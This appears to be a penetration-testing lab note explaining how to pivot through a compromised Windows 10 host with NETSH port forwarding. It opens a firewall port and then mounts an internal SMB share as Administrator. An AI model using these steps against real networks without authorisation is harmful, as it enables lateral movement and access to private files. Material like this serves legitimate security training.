## NETSH

Remote Port Forwarding Example

Imagine you have a compromised Windows 10 client that has interfaces in two networks, one of which is inaccessible from the Internet.  You want access to port 445 on a host in that inaccessible network, so you decide to use the intermediate Windows host as a pivot point.

Requirements:

- If you get a SYSTEM level shell, you can use NETSH without worrying about UAC on all modern versions of Windows.  
- The Windows host must have the IP Helper service running 
- It also must have IPVv6 enabled on the interface we want to use.  
- Both of these are enabled by default on Windows OS's.

Execution:

1. Set up the tunnel on the Windows 10 client:

   ```powershell
   netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.216.10 connectport=445 connectaddress=172.16.216.5
   
   # Options
   interface	# Sets the context to 'interface'
   portproxy add v4tov4	# Setups up IPv4 to IPv4 Proxy
   listenport=4455 listenaddress=192.168.216.10	# Sets the proxy listener IP and port
   connectport=445 connectaddress=172.16.216.5	# Sets the IP and port to forward to
   ```

2. Confirm the Windows 10 client is listening on port 4455

   ```powershell
   netstat -anp TCP | find "4455"
   ```

3. Add a Firewall rule to allow port 4455 inbound to the interface:

   ```powershell
   netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.1.223 localport=4455 action=allow
   ```

4. Remember that Samba needs to be configured with a minimum version of SMBV2 due to Win2016's lack of SMBV1 support.

   ```bash
   # Note:  
   vi /etc/samba/smb.conf
   # Add this
   min protocol = SMB2
   ```

5. Attempt to connect to the compromised Win 10 client acting as a proxy:

   ```bash
   smbclient -L 192.168.216.10 --port=4455 --user=Administrator
   ```

   Note:  You may get an error `do_connect: Connection to 192.168.216.10 failed (Error NT_STATUS_IO_TIMEMOUT)`.  This is due to the nature of the proxy service and should not impact your ability to mount the shares.  I didn't get this error when I tried.

6. Verify you can mount a file share

   ```bash
   sudo mkdir /mnt/win2016_share
   sudo mount -t cifs -o port=4455 //192.168.216.10/Data -o username=Administrator,password=lab /mnt/win2016_share
   ls -la /mnt/win2016_share
   cat /mnt/win2016_share/data.txt
   ```

   

